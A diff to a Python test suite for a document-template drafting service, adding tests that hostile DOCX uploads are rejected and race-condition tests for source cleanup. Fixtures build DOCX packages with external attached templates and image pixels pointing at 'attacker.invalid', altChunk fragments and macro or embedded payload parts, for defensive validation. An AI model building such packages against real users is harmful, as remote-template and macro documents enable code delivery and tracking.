@@ -22,7 +22,11 @@ from app.models.studio_draft import (
     StudioDraftSnapshot,
     StudioSourceArtifact,
 )
-from app.schemas.studio_draft import StudioDraftCreate, StudioDraftPatch
+from app.schemas.studio_draft import (
+    StudioDraftCreate,
+    StudioDraftPatch,
+    StudioRevisionRequest,
+)
 from app.services.studio_drafts import StudioDraftService, StudioError
 
 pytestmark = pytest.mark.asyncio
@@ -80,6 +84,29 @@ def _tracked_change_docx_bytes():
                     1,
                 )
             rewritten.writestr(item, content)
+    return output.getvalue()
+
+
+def _mutated_docx_bytes(*, relationship=None, document_fragment=None, extra_part=None):
+    source = BytesIO(_docx_bytes())
+    output = BytesIO()
+    with (
+        zipfile.ZipFile(source) as archive,
+        zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as rewritten,
+    ):
+        for item in archive.infolist():
+            content = archive.read(item.filename)
+            if relationship and item.filename == "word/_rels/document.xml.rels":
+                content = content.replace(
+                    b"</Relationships>", relationship + b"</Relationships>", 1
+                )
+            if document_fragment and item.filename == "word/document.xml":
+                content = content.replace(
+                    b"<w:body>", b"<w:body>" + document_fragment, 1
+                )
+            rewritten.writestr(item, content)
+        if extra_part:
+            rewritten.writestr(extra_part, b"unsafe payload")
     return output.getvalue()
 
 
@@ -324,6 +351,65 @@ async def test_source_registration_rejects_spoofed_and_hostile_content(client):
     assert invalid_text.json()["detail"]["code"] == "invalid_source_content"
 
 
+@pytest.mark.parametrize(
+    "content",
+    [
+        _mutated_docx_bytes(
+            relationship=(
+                b'<Relationship Id="rId900" '
+                b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
+                b'Target="https://attacker.invalid/template.dotm" TargetMode="External"/>'
+            )
+        ),
+        _mutated_docx_bytes(
+            relationship=(
+                b'<Relationship Id="rId901" '
+                b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
+                b'Target="https://attacker.invalid/pixel.png" TargetMode="External"/>'
+            )
+        ),
+        _mutated_docx_bytes(document_fragment=b'<w:altChunk r:id="rId902"/>'),
+        _mutated_docx_bytes(extra_part="word/vbaProject.bin"),
+        _mutated_docx_bytes(extra_part="word/embeddings/payload.bin"),
+    ],
+    ids=[
+        "attached-template",
+        "external-image",
+        "altchunk",
+        "macro",
+        "embedded-payload",
+    ],
+)
+async def test_source_registration_rejects_active_external_docx_packages(
+    client, content
+):
+    response = await client.post(
+        "/api/template-studio/drafts/sources",
+        data={"format": "docx"},
+        files={
+            "source": (
+                "source.docx",
+                content,
+                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+            )
+        },
+    )
+    assert response.status_code == 422
+    assert response.json()["detail"]["code"] == "invalid_source_content"
+
+
+async def test_source_registration_permits_safe_external_docx_hyperlink(client):
+    content = _mutated_docx_bytes(
+        relationship=(
+            b'<Relationship Id="rId903" '
+            b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
+            b'Target="https://example.invalid/safe" TargetMode="External"/>'
+        )
+    )
+    source = await _register_source(client, content, "docx")
+    assert source["format"] == "docx"
+
+
 async def test_source_format_is_enforced_on_create_and_replace(client):
     markdown = await _register_source(
         client, b"Hello {{client_name}}", "markdown", "text/plain"
@@ -440,7 +526,7 @@ async def test_orphan_cleanup_is_bounded_and_never_deletes_referenced_source(
 
     service = StudioDraftService(db_session, test_tenant.id, test_user.id)
     monkeypatch.setattr(service.settings, "TEMPLATE_STUDIO_SOURCE_ORPHAN_TTL_HOURS", 1)
-    await service.create(
+    draft = await service.create(
         StudioDraftCreate.model_validate(
             {
                 "title": "Referenced markdown",
@@ -452,11 +538,167 @@ async def test_orphan_cleanup_is_bounded_and_never_deletes_referenced_source(
         ),
         "orphan-cleanup-reference",
     )
+    snapshot = await service.snapshot(
+        uuid.UUID(str(draft["id"])),
+        StudioRevisionRequest(expected_revision=1),
+        "orphan-cleanup-snapshot",
+    )
+    replacement = await service.register_source(
+        b"Replacement {{name}}", "markdown", "text/markdown"
+    )
+    await service.patch(
+        uuid.UUID(str(draft["id"])),
+        StudioDraftPatch.model_validate(
+            {
+                "base_revision": 1,
+                "operations": [
+                    {
+                        "op": "replace_source",
+                        "source_artifact_id": replacement["artifact_id"],
+                    }
+                ],
+            }
+        ),
+        "orphan-cleanup-replace",
+    )
 
     assert await service.purge_expired_source_orphans(limit=1) == 1
     assert await db_session.get(StudioSourceArtifact, orphan.id) is None
     assert await db_session.get(StudioSourceArtifact, referenced.id) is not None
+    snapshot_row = await db_session.get(
+        StudioDraftSnapshot, uuid.UUID(str(snapshot["id"]))
+    )
+    assert snapshot_row.source_artifact_id == referenced.id
     assert await service.purge_expired_source_orphans(limit=1) == 0
+
+
+async def test_cleanup_vs_create_serializes_source_attachment(
+    db_session, test_engine, test_tenant, test_user, monkeypatch
+):
+    content = b"Old create-race source"
+    artifact = StudioSourceArtifact(
+        tenant_id=test_tenant.id,
+        sha256=hashlib.sha256(content).hexdigest(),
+        media_type="text/markdown",
+        format="markdown",
+        byte_size=len(content),
+        resolver_key=f"studio-db:v1:{uuid.uuid4()}",
+        content_bytes=content,
+        created_by_user_id=test_user.id,
+        created_at=datetime.now(timezone.utc) - timedelta(hours=3),
+    )
+    db_session.add(artifact)
+    await db_session.commit()
+    monkeypatch.setattr(get_settings(), "TEMPLATE_STUDIO_SOURCE_ORPHAN_TTL_HOURS", 1)
+    factory = async_sessionmaker(test_engine, expire_on_commit=False)
+
+    async def cleanup():
+        async with factory() as session:
+            return await StudioDraftService(
+                session, test_tenant.id, test_user.id
+            ).purge_expired_source_orphans(limit=10)
+
+    async def create():
+        async with factory() as session:
+            service = StudioDraftService(session, test_tenant.id, test_user.id)
+            try:
+                return await service.create(
+                    StudioDraftCreate.model_validate(
+                        {
+                            "title": "Create race",
+                            "format": "markdown",
+                            "source_artifact_id": artifact.id,
+                            "fields": [],
+                            "placements": [],
+                        }
+                    ),
+                    "cleanup-create-race",
+                )
+            except StudioError as exc:
+                await session.rollback()
+                return exc
+
+    deleted, attached = await asyncio.gather(cleanup(), create())
+    if isinstance(attached, StudioError):
+        assert attached.status_code == 404
+        assert deleted == 1
+    else:
+        assert deleted == 0
+        assert attached["source"]["artifact_id"] == artifact.id
+
+
+async def test_cleanup_vs_replace_serializes_source_attachment(
+    db_session, test_engine, test_tenant, test_user, monkeypatch
+):
+    bootstrap = StudioDraftService(db_session, test_tenant.id, test_user.id)
+    current = await bootstrap.register_source(
+        b"Current replace-race source", "markdown", "text/markdown"
+    )
+    draft = await bootstrap.create(
+        StudioDraftCreate.model_validate(
+            {
+                "title": "Replace race",
+                "format": "markdown",
+                "source_artifact_id": current["artifact_id"],
+                "fields": [],
+                "placements": [],
+            }
+        ),
+        "cleanup-replace-create",
+    )
+    target_content = b"Old replace-race target"
+    target = StudioSourceArtifact(
+        tenant_id=test_tenant.id,
+        sha256=hashlib.sha256(target_content).hexdigest(),
+        media_type="text/markdown",
+        format="markdown",
+        byte_size=len(target_content),
+        resolver_key=f"studio-db:v1:{uuid.uuid4()}",
+        content_bytes=target_content,
+        created_by_user_id=test_user.id,
+        created_at=datetime.now(timezone.utc) - timedelta(hours=3),
+    )
+    db_session.add(target)
+    await db_session.commit()
+    monkeypatch.setattr(get_settings(), "TEMPLATE_STUDIO_SOURCE_ORPHAN_TTL_HOURS", 1)
+    factory = async_sessionmaker(test_engine, expire_on_commit=False)
+
+    async def cleanup():
+        async with factory() as session:
+            return await StudioDraftService(
+                session, test_tenant.id, test_user.id
+            ).purge_expired_source_orphans(limit=10)
+
+    async def replace():
+        async with factory() as session:
+            service = StudioDraftService(session, test_tenant.id, test_user.id)
+            try:
+                return await service.patch(
+                    uuid.UUID(str(draft["id"])),
+                    StudioDraftPatch.model_validate(
+                        {
+                            "base_revision": 1,
+                            "operations": [
+                                {
+                                    "op": "replace_source",
+                                    "source_artifact_id": target.id,
+                                }
+                            ],
+                        }
+                    ),
+                    "cleanup-replace-race",
+                )
+            except StudioError as exc:
+                await session.rollback()
+                return exc
+
+    deleted, replaced = await asyncio.gather(cleanup(), replace())
+    if isinstance(replaced, StudioError):
+        assert replaced.status_code == 404
+        assert deleted == 1
+    else:
+        assert deleted == 0
+        assert replaced["source"]["artifact_id"] == target.id
 
 
 async def test_leaked_field_and_placement_ids_match_nonexistent_behavior(client):
